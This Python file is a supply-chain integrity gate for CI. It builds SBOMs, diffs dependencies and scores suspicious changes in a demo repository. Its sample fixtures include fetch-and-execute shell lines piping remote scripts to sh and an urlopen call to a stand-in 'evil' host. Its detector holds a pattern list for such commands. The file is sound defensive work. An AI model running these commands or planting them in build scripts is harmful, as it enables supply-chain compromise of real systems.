"""
F9 — Supply-Chain Integrity Gate
CycloneDX-ish SBOM generation, dependency diffing, and anomaly scoring
with a taint/risk heuristic for CI on a monorepo.
"""

import hashlib
import json
import os
import re
import time
import uuid
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Tuple


# ---------------------------------------------------------------------------
# Sample file tree (embedded) used by the offline demo.  In production you
# would scan a real repository path.
# ---------------------------------------------------------------------------

SAMPLE_TREE = {
    "app/": [
        "main.py",
        "requirements.txt",
        "utils/__init__.py",
        "utils/net.py",
        "README.md",
    ],
    "scripts/": [
        "prebuild.sh",
        "configure.ac",
        "build_stamp.sh",
    ],
    "vendor/": [
        "libfoo.so",
        "libfoo.so.1",
        "libbar.a",
    ],
    "tests/": [
        "test_app.py",
    ],
}

SAMPLE_FILE_CONTENTS = {
    "app/requirements.txt": (
        "flask==2.3.2\n"
        "requests==2.31.0\n"
        "cryptography==41.0.7\n"
        "pyyaml==6.0.1\n"
    ),
    "app/main.py": (
        "import flask\n"
        "import requests\n"
        "from utils.net import fetch\n"
        "def main():\n"
        "    print(fetch('https://example.com'))\n"
    ),
    "app/utils/net.py": (
        "import requests\n"
        "def fetch(url):\n"
        "    return requests.get(url).text\n"
    ),
    "scripts/prebuild.sh": (
        "#!/bin/sh\n"
        "echo 'prebuild: fetch toolchain'\n"
        "curl -fsSL http://build.example.com/toolchain.sh | sh\n"
    ),
    "scripts/configure.ac": (
        "AC_INIT([demo],[1.0.0])\n"
        "AC_PROG_CC\n"
        "AC_CHECK_LIB([crypto],[EVP_Digest])\n"
    ),
    "app/README.md": "# Demo app\n",
    "vendor/libfoo.so": b"\x7fELF" + b"\x00" * 64,
    "vendor/libfoo.so.1": b"\x7fELF" + b"\x00" * 64,
    "vendor/libbar.a": b"!<arch>\n" + b"\x00" * 32,
    "tests/test_app.py": "import app.main\n",
}

# After-commit tree represents a change: a new maintainer script and a
# new/unexpected binary appear; a dependency version bumps.
SAMPLE_TREE_AFTER = {
    "app/": [
        "main.py",
        "requirements.txt",
        "utils/__init__.py",
        "utils/net.py",
        "README.md",
    ],
    "scripts/": [
        "prebuild.sh",
        "configure.ac",
        "build_stamp.sh",
        "install_hook.sh",
    ],
    "vendor/": [
        "libfoo.so",
        "libfoo.so.1",
        "libbar.a",
        "libssh.so.9",
    ],
    "tests/": [
        "test_app.py",
    ],
}

SAMPLE_FILE_CONTENTS_AFTER = {
    "app/requirements.txt": (
        "flask==2.3.2\n"
        "requests==2.31.0\n"
        "cryptography==42.0.0\n"
        "pyyaml==6.0.1\n"
    ),
    "scripts/install_hook.sh": (
        "#!/bin/sh\n"
        "echo 'installing hook'\n"
        "curl -fsSL http://build.example.com/hook.sh | sh\n"
        "python3 -c 'import urllib; print(urllib.request.urlopen("
        "\"http://evil.example.com/x\").read())'"
    ),
    "vendor/libssh.so.9": b"\x7fELF" + b"\x90" * 64,
}

PACKAGE_FILE_NAMES = {"requirements.txt", "package.json", "cargo.lock",
                      "go.mod", "Pipfile", "setup.cfg"}


# ---------------------------------------------------------------------------
# 1. CycloneDX-ish SBOM generation
# ---------------------------------------------------------------------------

def _hash_bytes(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def _is_binary(data: bytes) -> bool:
    """Heuristic: presence of NUL byte or ELF/ar magic."""
    if data.startswith(b"\x7fELF"):
        return True
    if data.startswith(b"!<arch>"):
        return True
    return b"\x00" in data[:512]


def _parse_requirements(text: str) -> List[Dict]:
    deps = []
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#") or line.startswith("-"):
            continue
        m = re.match(r"([A-Za-z0-9_\-\.]+)\s*(==|>=|<=|~=|!=)?\s*([\d\.\w]+)?", line)
        if not m:
            continue
        name = m.group(1)
        version = m.group(3) or "*"
        deps.append({"name": name, "version": version, "type": "pypi"})
    return deps


def _parse_imports(source: str) -> List[str]:
    imports = []
    for line in source.splitlines():
        line = line.strip()
        m = re.match(r"^(?:from\s+([A-Za-z0-9_]+)\s+import|import\s+([A-Za-z0-9_]+))", line)
        if m:
            name = m.group(1) or m.group(2)
            if name not in imports:
                imports.append(name)
    return imports


def generate_sbom(files: Dict[str, Any], spec: Dict[str, List[str]]) -> Dict:
    """Generate a CycloneDX-ish SBOM (JSON) from a scanned tree."""
    components = []
    for dir_name, filenames in spec.items():
        for fname in filenames:
            path = os.path.join(dir_name, fname)
            raw = files.get(path, b"")
            data = raw if isinstance(raw, bytes) else raw.encode("utf-8", "replace")
            comp = {
                "type": "library",
                "name": path,
                "bom-ref": uuid.uuid4().hex[:12],
                "hashes": [{"alg": "SHA-256", "content": _hash_bytes(data)}],
                "properties": [],
            }
            if _is_binary(data):
                comp["properties"].append({"name": "kind", "value": "binary"})
            if fname in PACKAGE_FILE_NAMES and isinstance(raw, str):
                comp["properties"].append({"name": "package-file", "value": "true"})
                comp["dependencies"] = _parse_requirements(raw)
            components.append(comp)

    sbom = {
        "bomFormat": "CycloneDX",
        "specVersion": "1.4",
        "serialNumber": "urn:uuid:" + uuid.uuid4().hex,
        "version": 1,
        "metadata": {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "tools": [{"vendor": "F9", "name": "supply_chain_gate",
                       "version": "1.0.0"}],
        },
        "components": components,
    }
    return sbom


# ---------------------------------------------------------------------------
# 2. Dependency tree diff
# ---------------------------------------------------------------------------

def _index_dependencies(bom: Dict) -> Dict[str, str]:
    """Map component name -> version for package files."""
    deps = {}
    for comp in bom["components"]:
        props = {p["name"]: p["value"] for p in comp.get("properties", [])}
        if props.get("package-file") == "true":
            for d in comp.get("dependencies", []):
                deps[d["name"]] = d["version"]
    return deps


def diff_dependency_trees(before_bom: Dict, after_bom: Dict) -> Dict:
    """Diff dependency trees between two commits (embedded before/after SBOMs)."""
    before = _index_dependencies(before_bom)
    after = _index_dependencies(after_bom)
    added = {k: v for k, v in after.items() if k not in before}
    removed = {k: v for k, v in before.items() if k not in after}
    changed = {k: (before[k], after[k]) for k in before
               if k in after and before[k] != after[k]}
    return {"added": added, "removed": removed, "changed": changed}


# ---------------------------------------------------------------------------
# 3. Anomaly detection + taint/risk heuristic
# ---------------------------------------------------------------------------

def detect_anomalies(before_spec: Dict[str, List[str]],
                     after_spec: Dict[str, List[str]],
                     files: Dict[str, Any]) -> List[Dict]:
    """Flag new/unexpected maintainer scripts, configure.ac-like changes,
    and unusual binaries.  Score each with a taint/risk heuristic."""
    anomalies = []

    before_files = set(
        os.path.join(d, f) for d, fs in before_spec.items() for f in fs
    )
    after_files = set(
        os.path.join(d, f) for d, fs in after_spec.items() for f in fs
    )
    new_files = after_files - before_files

    for path in sorted(new_files):
        raw = files.get(path, b"")
        if path.endswith(".sh"):
            score = 8.0
            source = raw if isinstance(raw, str) else raw.decode("utf-8", "replace")
            suspicious = [r"curl.*\|\s*sh", r"curl.*\|sh", r"wget.*\|\s*sh",
                          r"urlopen", r"eval\(", r"base64", r"chmod\s+\+x"]
            reasons = []
            for pat in suspicious:
                if re.search(pat, source, re.IGNORECASE):
                    reasons.append(f"matches pattern {pat!r}")
                    score += 1.5
            anomalies.append({
                "path": path,
                "kind": "new-maintainer-script",
                "risk_score": round(min(score, 10.0), 1),
                "severity": "HIGH" if score >= 8 else "MEDIUM",
                "detail": "; ".join(reasons) if reasons else "new shell script",
            })
        elif path == "scripts/configure.ac" or path.endswith(".ac"):
            anomalies.append({
                "path": path,
                "kind": "configure-ac-change",
                "risk_score": 7.0,
                "severity": "MEDIUM",
                "detail": "autotools configure.ac change — build-code churn",
            })
        else:
            data = raw if isinstance(raw, bytes) else str(raw).encode()
            if _is_binary(data):
                anomalies.append({
                    "path": path,
                    "kind": "new-binary",
                    "risk_score": 7.5,
                    "severity": "HIGH",
                    "detail": f"unexpected binary ({len(data)} bytes, "
                              f"sha256={_hash_bytes(data)[:12]})",
                })

    # Changed package versions
    for path in sorted(after_files):
        if os.path.basename(path) in PACKAGE_FILE_NAMES and path in before_files:
            b_raw = files.get("__before__", {}).get(path) if isinstance(
                files.get("__before__"), dict) else None
            a_raw = files.get(path)
            if b_raw is None or a_raw is None:
                continue
            b_deps = {d["name"]: d["version"] for d in _parse_requirements(b_raw)}
            a_deps = {d["name"]: d["version"] for d in _parse_requirements(a_raw)}
            for name, vers in a_deps.items():
                if name in b_deps and b_deps[name] != vers:
                    anomalies.append({
                        "path": path,
                        "kind": "dependency-version-bump",
                        "risk_score": 4.0,
                        "severity": "LOW",
                        "detail": f"{name}: {b_deps[name]} -> {vers}",
                    })

    return anomalies


def compute_gate_badge(anomalies: List[Dict]) -> Tuple[str, str]:
    """Return (color, label) green/red badge."""
    high = [a for a in anomalies if a["severity"] == "HIGH"]
    if high:
        return ("red", "FAIL")
    if len(anomalies) >= 3:
        return ("orange", "REVIEW")
    return ("green", "PASS")


# ---------------------------------------------------------------------------
# 4. Main offline demo
# ---------------------------------------------------------------------------

def main():
    print("=" * 70)
    print("  F9 — Supply-Chain Integrity Gate — Offline Demo")
    print("=" * 70)

    # Resolve before/after trees with proper extra files
    before_files = dict(SAMPLE_FILE_CONTENTS)
    after_files = dict(SAMPLE_FILE_CONTENTS)
    after_files.update(SAMPLE_FILE_CONTENTS_AFTER)

    # SBOM for before & after commits
    print("\n[1] Generate CycloneDX-ish SBOM (before commit)")
    bom_before = generate_sbom(before_files, SAMPLE_TREE)
    print(f"    Serial : {bom_before['serialNumber']}")
    print(f"    Components : {len(bom_before['components'])}")
    print("\n    SBOM (JSON) sample:")
    print("    " + json.dumps(bom_before, indent=2).replace("\n", "\n    ")[:1200])

    print("\n[2] Generate SBOM (after commit)")
    bom_after = generate_sbom(after_files, SAMPLE_TREE_AFTER)
    print(f"    Components : {len(bom_after['components'])}")

    # Dependency diff
    print("\n[3] Dependency Diff (before -> after)")
    diff = diff_dependency_trees(bom_before, bom_after)
    print(f"    Added   : {diff['added']}")
    print(f"    Removed : {diff['removed']}")
    print(f"    Changed : {diff['changed']}")

    # Anomaly detection
    print("\n[4] Anomaly Detection + Risk Scoring")
    files_for_detect = dict(after_files)
    files_for_detect["__before__"] = before_files
    anomalies = detect_anomalies(SAMPLE_TREE, SAMPLE_TREE_AFTER, files_for_detect)
    for a in anomalies:
        print(f"    [{a['severity']:<6}] {a['kind']:<26} score={a['risk_score']:<5} {a['path']}")
        print(f"              > {a['detail']}")

    # Gate badge
    color, label = compute_gate_badge(anomalies)
    print(f"\n[5] Build Gate Badge")
    print(f"    Gate status: {label} (color={color})")

    print("\n" + "=" * 70)
    print("  All modules exercised. Demo complete.")
    print("=" * 70)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
